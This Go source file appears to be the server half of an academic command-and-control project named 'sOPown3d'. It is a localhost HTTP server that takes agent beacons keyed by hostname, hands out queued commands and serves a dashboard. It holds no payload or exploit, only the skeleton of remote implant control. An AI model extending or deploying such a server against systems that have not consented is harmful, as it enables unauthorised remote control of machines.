package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"time"

	"sOPown3d/shared"
)

var (
	connectionCount = 0
	pendingCommands = make(map[string]shared.Command)
	templates       *template.Template // var pour les templates
)

func init() {
	templates = template.Must(template.ParseGlob("../templates/*.html")) // Charger les templates à l'init
}

func main() {
	fmt.Println(
		"=== Serveur sOPown3d - Gestion Commandes ===\n" +
			"URL: http://127.0.0.1:8080\n" +
			"Usage académique uniquement\n" +
			"============================================")

	http.HandleFunc("/beacon", handleBeacon)
	http.HandleFunc("/command", handleSendCommand)
	http.HandleFunc("/", handleDashboard)

	err := http.ListenAndServe("127.0.0.1:8080", nil)
	if err != nil {
		fmt.Println("Erreur:", err)
	}
}

func handleDashboard(w http.ResponseWriter, _ *http.Request) {
	data := shared.DashboardData{
		DefaultAgent: "AgentID à voir comment recupérer dynamiquement",
	}

	err := templates.ExecuteTemplate(w, "dashboard.html", data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		fmt.Println("Erreur template:", err)
	}
}

func handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	connectionCount++

	var agentInfo shared.AgentInfo
	err := json.NewDecoder(r.Body).Decode(&agentInfo)

	now := time.Now().Format("15:04:05")

	if err != nil {
		fmt.Printf("[%s] Erreur JSON\n", now)
		w.WriteHeader(400)
		return
	}

	agentID := agentInfo.Hostname

	if cmd, exists := pendingCommands[agentID]; exists {
		json.NewEncoder(w).Encode(cmd)
		delete(pendingCommands, agentID)
		fmt.Printf("    → Envoyé: %s\n", cmd.Action)
	} else {
		w.WriteHeader(200)
		fmt.Printf("bip ")
		w.Write([]byte("{}"))
	}
}

func handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	var cmd shared.Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	pendingCommands[cmd.ID] = cmd

	fmt.Printf("[!] Commande pour %s: %s\n", cmd.ID, cmd.Action)

	w.Write([]byte(`{"status": "ok"}`))
}
